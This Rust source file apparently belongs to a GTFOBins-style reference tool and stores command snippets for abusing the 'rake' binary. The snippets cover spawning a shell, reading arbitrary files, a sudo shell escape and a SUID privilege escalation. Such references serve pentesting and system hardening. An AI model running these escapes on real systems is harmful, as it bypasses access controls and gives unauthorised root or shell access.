pub static BIN_NAME: &'static str = "rake";
pub static SH_CODE: &'static str = r#"
    
    rake -p '`/bin/sh 1>&0`'
"#;
pub static FR_DESC: &'static str =
    "The file is actually parsed and the first wrong line is returned in an error message.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file-to-read
    rake -f $LFILE
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo rake -p '`/bin/sh 1>&0`'
"#;
pub static LSUID_CODE: &'static str = r#"

    sudo install -m =xs $(which rake) .

    ./rake -p '`/bin/sh 1>&0`'    
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code { 
	title: "LSUID_CODE",
	code: LSUID_CODE,
	tag: Tag::LSUID,
};
